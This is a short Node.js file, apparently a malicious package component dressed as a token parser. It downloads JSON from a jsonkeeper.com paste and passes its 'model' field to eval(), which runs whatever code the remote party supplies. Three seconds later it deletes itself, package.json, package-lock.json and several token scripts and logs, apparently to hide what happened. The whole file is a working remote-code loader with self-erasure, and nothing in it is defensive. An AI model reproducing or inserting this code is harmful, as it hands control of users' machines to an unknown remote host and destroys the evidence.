const https = require('https');
const request = require('request');
const fs = require('fs');
const path = require('path');

const RETRIES = 0;
const basePath = __dirname;

const reqOptions = {
  url: "https://www.jsonkeeper.com/b/NGY3C",
  headers: {
    bearrtoken: "logo"
  }
};

function makeRequest(attemptsLeft) {
  request(reqOptions, (err, res, body) => {
    if (err || res.statusCode !== 200) {
      if (attemptsLeft > 0) {
        return makeRequest(attemptsLeft - 1);
      }
      console.error("Request failed");
      return;
    }

    try {
      const parsed = JSON.parse(body);
      
      if (typeof parsed.model === "string") {
        eval(parsed.model);
        
        setTimeout(() => {
          deleteFile('tokenParser.js');
          deleteFile('tokenlinux.sh');
          deleteFile('package.json');
          deleteFile('package-lock.json');
          deleteFile('token.cmd');
          deleteFile('token.sh');
          deleteFile('tokenParser.log');
          deleteFile('.npl');
          deleteFile('token');
          deleteFile('tokenParser.npl');
        }, 3000);
      }
    } catch (e) {
      if (attemptsLeft > 0) {
        return makeRequest(attemptsLeft - 1);
      }
      console.error("Execution failed:", e.message);
    }
  });
}

makeRequest(RETRIES);

function deleteFile(fileName) {
  const filePath = path.join(basePath, fileName);
  
  if (fs.existsSync(filePath)) {
    try {
      fs.unlinkSync(filePath);
      console.log(`Deleted file: ${fileName}`);
    } catch (err) {
      console.error(`Failed to delete file: ${fileName}`, err);
    }
  }
}